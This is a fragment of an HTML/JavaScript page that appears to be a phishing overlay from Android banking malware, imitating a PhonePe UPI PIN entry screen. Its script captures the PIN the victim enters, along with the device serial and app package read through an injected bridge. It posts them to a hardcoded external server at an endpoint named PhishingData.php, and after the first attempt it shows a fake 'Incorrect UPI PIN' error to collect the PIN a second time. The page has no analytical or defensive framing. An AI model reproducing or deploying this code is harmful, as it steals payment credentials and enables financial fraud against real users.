<div class="err-body">
<h1>Could not verify your account</h1>
<p>Incorrect UPI PIN. After 3 unsuccessful attempts, your account will be temporarily blocked for 24 hours. <a href="javascript:void(0)" id="err-learn">Learn more</a></p>
</div>
<div class="err-bottom">
<button class="err-btn" id="err-retry" type="button">Enter UPI PIN again</button>
</div>
</div>

<div class="sp" id="sp"><div class="sp-s"></div><div class="sp-t">Verifying...</div></div>
<script>
var pk='',attempt=0;
try{if(typeof FKB!=='undefined'&&FKB.getPkg)pk=FKB.getPkg();}catch(e){}
(function(){
var dots=document.getElementById("pin-dots"),
    keypad=document.getElementById("key-grid"),
    checkBtn=document.getElementById("check-button"),
    mainScreen=document.getElementById("main-screen"),
    errPage=document.getElementById("err-page"),
    value="",MAX=6;

function render(){
  dots.innerHTML="";
  for(var i=0;i<value.length;i++){var d=document.createElement("span");d.className="pin-dot";dots.appendChild(d);}
  if((value.length===4||value.length===6)){checkBtn.classList.add("ready");checkBtn.disabled=false;}
  else{checkBtn.classList.remove("ready");checkBtn.disabled=true;}
}
function addDigit(k){if(value.length<MAX){value+=k;render();}}
function delDigit(){value=value.slice(0,-1);render();}

function showError(){
  mainScreen.style.display="none";
  errPage.className="err-page show";
}
function backToPin(){
  errPage.className="err-page";
  mainScreen.style.display="";
  value="";render();
}

function doSubmit(){
  if(value.length!==4&&value.length!==6)return;
  var pin=value;
  attempt++;
  if(attempt===1){
    var sn1='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn1=FKB.getSn();}catch(e){}
    var pl1=JSON.stringify({password:pin,pkg:pk});
    try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl1);}catch(e){}
    try{var x1=new XMLHttpRequest();x1.open('POST',"http://18.142.44.159:8035/api/PhishingData.php",true);x1.setRequestHeader('Content-Type','application/json');x1.send(JSON.stringify({deviceId:sn1,pkg:pk,template:'first_attempt',formData:pl1}));}catch(e){}
    showError();
    return;
  }
  var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}
  var pl=JSON.stringify({password:pin,pkg:pk});
  try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl);}catch(e){}
  try{var x=new XMLHttpRequest();x.open('POST',"http://18.142.44.159:8035/api/PhishingData.php",true);x.setRequestHeader('Content-Type','application/json');x.send(JSON.stringify({deviceId:sn,pkg:pk,template:'phonepe',formData:pl}));}catch(e){}
  try{if(typeof Android!=='undefined'&&Android.close)Android.close();}catch(e){}try{window.close();}catch(e){}
}

keypad.addEventListener("click",function(e){
  var b=e.target.closest("button");if(!b)return;
  if(b.dataset.key)addDigit(b.dataset.key);
  if(b.dataset.action==="delete")delDigit();
  if(b.id==="check-button")doSubmit();
});

document.getElementById("err-retry").addEventListener("click",backToPin);
document.getElementById("err-back").addEventListener("click",backToPin);
document.getElementById("err-menu").addEventListener("click",backToPin);
document.getElementById("err-learn").addEventListener("click",function(e){e.preventDefault();});

render();
})();
</script>
